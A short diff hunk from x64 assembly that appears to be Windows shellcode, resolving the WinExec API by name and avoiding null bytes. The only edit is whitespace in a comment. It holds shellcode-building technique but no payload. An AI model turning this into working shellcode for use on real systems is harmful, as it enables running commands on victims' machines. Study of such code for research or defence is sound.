@@ -87,7 +87,7 @@ api db "WinExec"            ; <----!! CHANGE ME !! NOTE: Changing this requires 
 ;we can leverage that to omit one null byte, use an offset, and retain 0-null byes in the shellcode
 
 apis:                   	; API Names to resolve addresses
-							; WinExec | String length : 7
+			        ; WinExec | String length : 7
 xor rcx, rcx
 add cl, 0x7                 ; String length for compare string
 mov rax, [rel api]          ; Load pointer to api
